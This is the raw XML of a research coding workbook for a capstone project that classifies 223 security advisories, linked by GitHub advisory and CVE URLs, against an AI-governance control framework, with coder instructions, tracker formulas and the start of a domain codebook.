Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-83m8-c7v3-rw3w" TargetMode="External" Id="rId147"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-8q5r-mmjf-575q" TargetMode="External" Id="rId148"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-vjw4-v5gx-3v45" TargetMode="External" Id="rId149"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-48124" TargetMode="External" Id="rId150"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-4h5r-5jm8-jxjm" TargetMode="External" Id="rId151"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-qwjm-9c66-w4q4" TargetMode="External" Id="rId152"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-3jww-hxqj-wfq2" TargetMode="External" Id="rId153"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-m973-pr9r-hp2w" TargetMode="External" Id="rId154"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-fq4x-789w-jg5h" TargetMode="External" Id="rId155"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-2gq4-362c-56w9" TargetMode="External" Id="rId156"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-7vc2-x95v-g6m9" TargetMode="External" Id="rId157"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-53766" TargetMode="External" Id="rId158"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-4vp2-6q8c-pvq2" TargetMode="External" Id="rId159"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-50549" TargetMode="External" Id="rId160"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-gvpp-v77h-5w8g" TargetMode="External" Id="rId161"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-gj6m-4qqg-3cw8" TargetMode="External" Id="rId162"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-59726" TargetMode="External" Id="rId163"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-xrmc-c5cg-rv7x" TargetMode="External" Id="rId164"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-hjgg-v5cf-x59v" TargetMode="External" Id="rId165"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-61613" TargetMode="External" Id="rId166"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-63093" TargetMode="External" Id="rId167"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-5xxh-cfjg-qm65" TargetMode="External" Id="rId168"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-64650" TargetMode="External" Id="rId169"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-64651" TargetMode="External" Id="rId170"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-7835-87q9-rgvv" TargetMode="External" Id="rId171"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-c5px-58j2-7fqp" TargetMode="External" Id="rId172"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-47211" TargetMode="External" Id="rId173"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-hhmj-6g9r-9vvq" TargetMode="External" Id="rId174"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-vr58-qjgp-x52v" TargetMode="External" Id="rId175"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-7fr9-h24p-27wp" TargetMode="External" Id="rId176"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-f5cw-432q-pfqr" TargetMode="External" Id="rId177"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-46jg-c454-8hm3" TargetMode="External" Id="rId178"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-pgm3-v47m-2q8v" TargetMode="External" Id="rId179"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-hj52-q5wj-vpwg" TargetMode="External" Id="rId180"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-73217" TargetMode="External" Id="rId181"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-73218" TargetMode="External" Id="rId182"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-64vj-7c55-24w2" TargetMode="External" Id="rId183"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-hpx7-jm9p-88gh" TargetMode="External" Id="rId184"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-97r6-3rgm-v39r" TargetMode="External" Id="rId185"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-62674" TargetMode="External" Id="rId186"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-62675" TargetMode="External" Id="rId187"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-62677" TargetMode="External" Id="rId188"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-76072" TargetMode="External" Id="rId189"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-88j7-xhq4-rhh3" TargetMode="External" Id="rId190"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-3j8c-p2mq-9c5h" TargetMode="External" Id="rId191"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-q2jq-8pm2-fj8h" TargetMode="External" Id="rId192"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-57j6-cfwj-h582" TargetMode="External" Id="rId193"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-pjx2-9jx7-x89r" TargetMode="External" Id="rId194"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-433v-pqvh-w4gj" TargetMode="External" Id="rId195"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-2frj-4qr5-m2rf" TargetMode="External" Id="rId196"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-26wp-42v3-96xp" TargetMode="External" Id="rId197"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-hcf6-9q9g-xx3c" TargetMode="External" Id="rId198"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-7mqg-cx4g-x2rf" TargetMode="External" Id="rId199"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-79wm-x847-7cvg" TargetMode="External" Id="rId200"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-r64m-65x5-h3wx" TargetMode="External" Id="rId201"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-8qwj-prhm-6mp3" TargetMode="External" Id="rId202"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-cvxc-67pr-wffj" TargetMode="External" Id="rId203"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-8fwh-72qq-gr52" TargetMode="External" Id="rId204"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-2255-3477-vp73" TargetMode="External" Id="rId205"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-88899" TargetMode="External" Id="rId206"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-gpq4-73r8-h3fj" TargetMode="External" Id="rId207"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-54561" TargetMode="External" Id="rId208"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-57586" TargetMode="External" Id="rId209"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-54504" TargetMode="External" Id="rId210"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-fx2r-fm89-x94v" TargetMode="External" Id="rId211"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-xhcr-j4j9-3gh7" TargetMode="External" Id="rId212"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-6v3r-4p5c-mrp5" TargetMode="External" Id="rId213"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-3cj3-hqcr-g934" TargetMode="External" Id="rId214"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-356h-q6p2-3c99" TargetMode="External" Id="rId215"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-3fp8-r6r3-vjcc" TargetMode="External" Id="rId216"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-87g7-76gr-73g8" TargetMode="External" Id="rId217"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-55156" TargetMode="External" Id="rId218"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-55157" TargetMode="External" Id="rId219"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-vmfg-8hhv-69wh" TargetMode="External" Id="rId220"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-103012" TargetMode="External" Id="rId221"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-103435" TargetMode="External" Id="rId222"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-p449-r4wm-3hpm" TargetMode="External" Id="rId223"/></Relationships>
</file>

<file path=xl/worksheets/sheet1.xml><?xml version="1.0" encoding="utf-8"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetPr>
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr/>
  </sheetPr>
  <dimension ref="A1:S28"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="A1" sqref="A1"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultRowHeight="15"/>
  <cols>
    <col width="1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s>
  <sheetData>
    <row r="1">
      <c r="A1" s="1" t="inlineStr">
        <is>
          <t>ACEG Coding Workbook — QM640 Capstone, Group 3</t>
        </is>
      </c>
    </row>
    <row r="2">
      <c r="A2" s="2" t="inlineStr">
        <is>
          <t>Purpose: double coding of the 223 frozen cases against the ACEG Framework v1 (docs/codebook.md).</t>
        </is>
      </c>
    </row>
    <row r="3">
      <c r="A3" s="2" t="inlineStr"/>
    </row>
    <row r="4">
      <c r="A4" s="3" t="inlineStr">
        <is>
          <t>Which cells to edit</t>
        </is>
      </c>
    </row>
    <row r="5">
      <c r="A5" s="2" t="inlineStr">
        <is>
          <t>Coder1 / Coder2 sheets: only the YELLOW cells (d1–d8, primary_domain, c01–c20, covered, notes). Use the dropdowns.</t>
        </is>
      </c>
    </row>
    <row r="6">
      <c r="A6" s="2" t="inlineStr">
        <is>
          <t>Gold sheet: only blank YELLOW cells where the coders disagreed; type the agreed value after discussion.</t>
        </is>
      </c>
    </row>
    <row r="7">
      <c r="A7" s="2" t="inlineStr">
        <is>
          <t>Tracker sheet: coder names in the YELLOW cells. All other cells are formulas or source data — do not edit.</t>
        </is>
      </c>
    </row>
    <row r="8">
      <c r="A8" s="2" t="inlineStr"/>
    </row>
    <row r="9">
      <c r="A9" s="3" t="inlineStr">
        <is>
          <t>Coding rules (summary — full rules in docs/codebook.md)</t>
        </is>
      </c>
    </row>
    <row r="10">
      <c r="A10" s="2" t="inlineStr">
        <is>
          <t>1. Read the case on the Cases sheet (title, description, link). Use only what the advisory says.</t>
        </is>
      </c>
    </row>
    <row r="11">
      <c r="A11" s="2" t="inlineStr">
        <is>
          <t>2. d1–d8: 1 if the advisory shows that domain's requirement was breached or could be breached; otherwise 0.</t>
        </is>
      </c>
    </row>
    <row r="12">
      <c r="A12" s="2" t="inlineStr">
        <is>
          <t>3. primary_domain: the single domain (1–8) that most directly enabled the weakness; it must be one coded 1.</t>
        </is>
      </c>
    </row>
    <row r="13">
      <c r="A13" s="2" t="inlineStr">
        <is>
          <t>4. c01–c20: for controls linked to a domain coded 1, enter 1 = breached (absent, failed or bypassed) or 0 = not breached. Enter NA for controls whose domain is 0 (those cells turn grey).</t>
        </is>
      </c>
    </row>
    <row r="14">
      <c r="A14" s="2" t="inlineStr">
        <is>
          <t>5. covered: 1 if at least one breached control would plausibly have prevented the weakness; 0 if the framework has no control for it.</t>
        </is>
      </c>
    </row>
    <row r="15">
      <c r="A15" s="2" t="inlineStr">
        <is>
          <t>6. n_domains, n_applicable, n_breached, gcs and check are calculated automatically. Fix any message in 'check' before moving on.</t>
        </is>
      </c>
    </row>
    <row r="16">
      <c r="A16" s="2" t="inlineStr">
        <is>
          <t>7. Code independently. Do not look at the other coder's sheet until the batch is finished.</t>
        </is>
      </c>
    </row>
    <row r="17">
      <c r="A17" s="2" t="inlineStr">
        <is>
          <t>8. Stay blind to severity: do not look up the CVSS score or severity, and ignore any severity wording in the text when judging controls.</t>
        </is>
      </c>
    </row>
    <row r="18">
      <c r="A18" s="2" t="inlineStr"/>
    </row>
    <row r="19">
      <c r="A19" s="3" t="inlineStr">
        <is>
          <t>Schedule</t>
        </is>
      </c>
    </row>
    <row r="20">
      <c r="A20" s="2" t="inlineStr">
        <is>
          <t>Week 2: both coders code the 20 'W2 pilot' rows; run python src/05_pilot_kappa.py; revise codebook wording where κ &lt; .60.</t>
        </is>
      </c>
    </row>
    <row r="21">
      <c r="A21" s="2" t="inlineStr">
        <is>
          <t>Weeks 3–5: both coders code batches W3 (68), W4 (68), W5 (67); adjudicate disagreements on the Gold sheet weekly.</t>
        </is>
      </c>
    </row>
    <row r="22">
      <c r="A22" s="2" t="inlineStr">
        <is>
          <t>End of Week 5: run python src/06_build_coded_dataset.py to create data/processed/cases_coded.csv.</t>
        </is>
      </c>
    </row>
    <row r="23">
      <c r="A23" s="2" t="inlineStr"/>
    </row>
    <row r="24">
      <c r="A24" s="3" t="inlineStr">
        <is>
          <t>Example (case CA-018, CVE-2025-54795 — approval-prompt bypass in Claude Code)</t>
        </is>
      </c>
    </row>
    <row r="25">
      <c r="A25" s="4" t="inlineStr">
        <is>
          <t>d1</t>
        </is>
      </c>
      <c r="B25" s="4" t="inlineStr">
        <is>
          <t>d2</t>
        </is>
      </c>
      <c r="C25" s="4" t="inlineStr">
        <is>
          <t>d3</t>
        </is>
      </c>
      <c r="D25" s="4" t="inlineStr">
        <is>
          <t>d4</t>
        </is>
      </c>
      <c r="E25" s="4" t="inlineStr">
        <is>
          <t>d5</t>
        </is>
      </c>
      <c r="F25" s="4" t="inlineStr">
        <is>
          <t>d6</t>
        </is>
      </c>
      <c r="G25" s="4" t="inlineStr">
        <is>
          <t>d7</t>
        </is>
      </c>
      <c r="H25" s="4" t="inlineStr">
        <is>
          <t>d8</t>
        </is>
      </c>
      <c r="I25" s="4" t="inlineStr">
        <is>
          <t>primary_domain</t>
        </is>
      </c>
      <c r="J25" s="4" t="inlineStr">
        <is>
          <t>c01</t>
        </is>
      </c>
      <c r="K25" s="4" t="inlineStr">
        <is>
          <t>c02</t>
        </is>
      </c>
      <c r="L25" s="4" t="inlineStr">
        <is>
          <t>c03</t>
        </is>
      </c>
      <c r="M25" s="4" t="inlineStr">
        <is>
          <t>c08</t>
        </is>
      </c>
      <c r="N25" s="4" t="inlineStr">
        <is>
          <t>c09</t>
        </is>
      </c>
      <c r="O25" s="4" t="inlineStr">
        <is>
          <t>other controls</t>
        </is>
      </c>
      <c r="P25" s="4" t="inlineStr">
        <is>
          <t>covered</t>
        </is>
      </c>
      <c r="Q25" s="4" t="inlineStr">
        <is>
          <t>n_applicable</t>
        </is>
      </c>
      <c r="R25" s="4" t="inlineStr">
        <is>
          <t>n_breached</t>
        </is>
      </c>
      <c r="S25" s="4" t="inlineStr">
        <is>
          <t>gcs</t>
        </is>
      </c>
    </row>
    <row r="26">
      <c r="A26" s="5" t="n">
        <v>1</v>
      </c>
      <c r="B26" s="5" t="n">
        <v>0</v>
      </c>
      <c r="C26" s="5" t="n">
        <v>0</v>
      </c>
      <c r="D26" s="5" t="n">
        <v>1</v>
      </c>
      <c r="E26" s="5" t="n">
        <v>0</v>
      </c>
      <c r="F26" s="5" t="n">
        <v>0</v>
      </c>
      <c r="G26" s="5" t="n">
        <v>0</v>
      </c>
      <c r="H26" s="5" t="n">
        <v>0</v>
      </c>
      <c r="I26" s="5" t="n">
        <v>1</v>
      </c>
      <c r="J26" s="5" t="n">
        <v>0</v>
      </c>
      <c r="K26" s="5" t="n">
        <v>1</v>
      </c>
      <c r="L26" s="5" t="n">
        <v>0</v>
      </c>
      <c r="M26" s="5" t="n">
        <v>1</v>
      </c>
      <c r="N26" s="5" t="n">
        <v>0</v>
      </c>
      <c r="O26" s="5" t="inlineStr">
        <is>
          <t>NA</t>
        </is>
      </c>
      <c r="P26" s="5" t="n">
        <v>1</v>
      </c>
      <c r="Q26" s="5" t="n">
        <v>5</v>
      </c>
      <c r="R26" s="5" t="n">
        <v>2</v>
      </c>
      <c r="S26" s="5" t="n">
        <v>60</v>
      </c>
    </row>
    <row r="28">
      <c r="A28" s="6" t="inlineStr">
        <is>
          <t>Note: column A on this sheet holds long text; widen it or read in the formula bar.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6" customWidth="1" min="7" max="7"/>
  </cols>
  <sheetData>
    <row r="1">
      <c r="A1" s="4" t="inlineStr">
        <is>
          <t>Role</t>
        </is>
      </c>
      <c r="B1" s="4" t="inlineStr">
        <is>
          <t>Name</t>
        </is>
      </c>
    </row>
    <row r="2">
      <c r="A2" s="2" t="inlineStr">
        <is>
          <t>Coder 1</t>
        </is>
      </c>
      <c r="B2" s="7" t="inlineStr"/>
      <c r="C2" s="2" t="n"/>
      <c r="D2" s="2" t="n"/>
      <c r="E2" s="2" t="n"/>
      <c r="F2" s="2" t="n"/>
      <c r="G2" s="2" t="n"/>
    </row>
    <row r="3">
      <c r="A3" s="2" t="inlineStr">
        <is>
          <t>Coder 2</t>
        </is>
      </c>
      <c r="B3" s="7" t="inlineStr"/>
      <c r="C3" s="2" t="n"/>
      <c r="D3" s="2" t="n"/>
      <c r="E3" s="2" t="n"/>
      <c r="F3" s="2" t="n"/>
      <c r="G3" s="2" t="n"/>
    </row>
    <row r="4">
      <c r="A4" s="2" t="inlineStr">
        <is>
          <t>Adjudicator (if the coders cannot agree)</t>
        </is>
      </c>
      <c r="B4" s="7" t="inlineStr"/>
      <c r="C4" s="2" t="n"/>
      <c r="D4" s="2" t="n"/>
      <c r="E4" s="2" t="n"/>
      <c r="F4" s="2" t="n"/>
      <c r="G4" s="2" t="n"/>
    </row>
    <row r="5">
      <c r="A5" s="2" t="n"/>
      <c r="B5" s="2" t="n"/>
      <c r="C5" s="2" t="n"/>
      <c r="D5" s="2" t="n"/>
      <c r="E5" s="2" t="n"/>
      <c r="F5" s="2" t="n"/>
      <c r="G5" s="2" t="n"/>
    </row>
    <row r="6">
      <c r="A6" s="4" t="inlineStr">
        <is>
          <t>Batch</t>
        </is>
      </c>
      <c r="B6" s="4" t="inlineStr">
        <is>
          <t>Cases</t>
        </is>
      </c>
      <c r="C6" s="4" t="inlineStr">
        <is>
          <t>Week due</t>
        </is>
      </c>
      <c r="D6" s="4" t="inlineStr">
        <is>
          <t>Coder 1 done</t>
        </is>
      </c>
      <c r="E6" s="4" t="inlineStr">
        <is>
          <t>Coder 2 done</t>
        </is>
      </c>
      <c r="F6" s="4" t="inlineStr">
        <is>
          <t>Both done, full agreement</t>
        </is>
      </c>
      <c r="G6" s="4" t="inlineStr">
        <is>
          <t>Gold complete</t>
        </is>
      </c>
    </row>
    <row r="7">
      <c r="A7" s="2" t="inlineStr">
        <is>
          <t>W2 pilot</t>
        </is>
      </c>
      <c r="B7" s="2">
        <f>COUNTIF(Cases!$B$2:$B$224,A7)</f>
        <v/>
      </c>
      <c r="C7" s="2" t="inlineStr">
        <is>
          <t>Week 2</t>
        </is>
      </c>
      <c r="D7" s="2">
        <f>SUMPRODUCT((Coder1!$B$2:$B$224=A7)*(Coder1!$AN$2:$AN$224=1))</f>
        <v/>
      </c>
      <c r="E7" s="2">
        <f>SUMPRODUCT((Coder2!$B$2:$B$224=A7)*(Coder2!$AN$2:$AN$224=1))</f>
        <v/>
      </c>
      <c r="F7" s="2">
        <f>SUMPRODUCT((Gold!$B$2:$B$224=A7)*(Gold!$AN$2:$AN$224=1))</f>
        <v/>
      </c>
      <c r="G7" s="2">
        <f>SUMPRODUCT((Gold!$B$2:$B$224=A7)*(Gold!$AM$2:$AM$224=""))</f>
        <v/>
      </c>
    </row>
    <row r="8">
      <c r="A8" s="2" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="B8" s="2">
        <f>COUNTIF(Cases!$B$2:$B$224,A8)</f>
        <v/>
      </c>
      <c r="C8" s="2" t="inlineStr">
        <is>
          <t>Week 3</t>
        </is>
      </c>
      <c r="D8" s="2">
        <f>SUMPRODUCT((Coder1!$B$2:$B$224=A8)*(Coder1!$AN$2:$AN$224=1))</f>
        <v/>
      </c>
      <c r="E8" s="2">
        <f>SUMPRODUCT((Coder2!$B$2:$B$224=A8)*(Coder2!$AN$2:$AN$224=1))</f>
        <v/>
      </c>
      <c r="F8" s="2">
        <f>SUMPRODUCT((Gold!$B$2:$B$224=A8)*(Gold!$AN$2:$AN$224=1))</f>
        <v/>
      </c>
      <c r="G8" s="2">
        <f>SUMPRODUCT((Gold!$B$2:$B$224=A8)*(Gold!$AM$2:$AM$224=""))</f>
        <v/>
      </c>
    </row>
    <row r="9">
      <c r="A9" s="2" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="B9" s="2">
        <f>COUNTIF(Cases!$B$2:$B$224,A9)</f>
        <v/>
      </c>
      <c r="C9" s="2" t="inlineStr">
        <is>
          <t>Week 4</t>
        </is>
      </c>
      <c r="D9" s="2">
        <f>SUMPRODUCT((Coder1!$B$2:$B$224=A9)*(Coder1!$AN$2:$AN$224=1))</f>
        <v/>
      </c>
      <c r="E9" s="2">
        <f>SUMPRODUCT((Coder2!$B$2:$B$224=A9)*(Coder2!$AN$2:$AN$224=1))</f>
        <v/>
      </c>
      <c r="F9" s="2">
        <f>SUMPRODUCT((Gold!$B$2:$B$224=A9)*(Gold!$AN$2:$AN$224=1))</f>
        <v/>
      </c>
      <c r="G9" s="2">
        <f>SUMPRODUCT((Gold!$B$2:$B$224=A9)*(Gold!$AM$2:$AM$224=""))</f>
        <v/>
      </c>
    </row>
    <row r="10">
      <c r="A10" s="2" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="B10" s="2">
        <f>COUNTIF(Cases!$B$2:$B$224,A10)</f>
        <v/>
      </c>
      <c r="C10" s="2" t="inlineStr">
        <is>
          <t>Week 5</t>
        </is>
      </c>
      <c r="D10" s="2">
        <f>SUMPRODUCT((Coder1!$B$2:$B$224=A10)*(Coder1!$AN$2:$AN$224=1))</f>
        <v/>
      </c>
      <c r="E10" s="2">
        <f>SUMPRODUCT((Coder2!$B$2:$B$224=A10)*(Coder2!$AN$2:$AN$224=1))</f>
        <v/>
      </c>
      <c r="F10" s="2">
        <f>SUMPRODUCT((Gold!$B$2:$B$224=A10)*(Gold!$AN$2:$AN$224=1))</f>
        <v/>
      </c>
      <c r="G10" s="2">
        <f>SUMPRODUCT((Gold!$B$2:$B$224=A10)*(Gold!$AM$2:$AM$224=""))</f>
        <v/>
      </c>
    </row>
    <row r="11">
      <c r="A11" s="3" t="inlineStr">
        <is>
          <t>Total</t>
        </is>
      </c>
      <c r="B11" s="3">
        <f>SUM(B7:B10)</f>
        <v/>
      </c>
      <c r="C11" s="3" t="n"/>
      <c r="D11" s="3">
        <f>SUM(D7:D10)</f>
        <v/>
      </c>
      <c r="E11" s="3">
        <f>SUM(E7:E10)</f>
        <v/>
      </c>
      <c r="F11" s="3">
        <f>SUM(F7:F10)</f>
        <v/>
      </c>
      <c r="G11" s="3">
        <f>SUM(G7:G10)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8" customWidth="1" min="1" max="1"/>
    <col width="62" customWidth="1" min="2" max="2"/>
    <col width="10" customWidth="1" min="3" max="3"/>
    <col width="22" customWidth="1" min="4" max="4"/>
  </cols>
  <sheetData>
    <row r="1">
      <c r="A1" s="4" t="inlineStr">
        <is>
          <t>Code</t>
        </is>
      </c>
      <c r="B1" s="4" t="inlineStr">
        <is>
          <t>Domain</t>
        </is>
      </c>
      <c r="C1" s="4" t="inlineStr">
        <is>
          <t>Family</t>
        </is>
      </c>
      <c r="D1" s="4" t="inlineStr">
        <is>
          <t>Linked controls</t>
        </is>
      </c>
    </row>
    <row r="2">
      <c r="A2" s="2" t="inlineStr">
        <is>
          <t>D1</t>
        </is>
      </c>
      <c r="B2" s="2" t="inlineStr">
        <is>
          <t>Agency and action control</t>
        </is>
      </c>
      <c r="C2" s="2" t="inlineStr">
        <is>
          <t>A</t>
        </is>
      </c>
      <c r="D2" s="2" t="inlineStr">
        <is>
          <t>C01, C02, C03</t>
        </is>
      </c>
    </row>
    <row r="3">
      <c r="A3" s="2" t="inlineStr">
        <is>
          <t>D2</t>
        </is>
      </c>
      <c r="B3" s="2" t="inlineStr">
        <is>
          <t>Instruction and boundary adherence</t>
        </is>
      </c>
      <c r="C3" s="2" t="inlineStr">
        <is>
          <t>A</t>
        </is>
      </c>
      <c r="D3" s="2" t="inlineStr">
        <is>
          <t>C04, C05</t>
        </is>
      </c>
    </row>
    <row r="4">
      <c r="A4" s="2" t="inlineStr">
        <is>
          <t>D3</t>
        </is>
      </c>
      <c r="B4" s="2" t="inlineStr">
        <is>
          <t>Transparency and honest reporting</t>
        </is>
      </c>
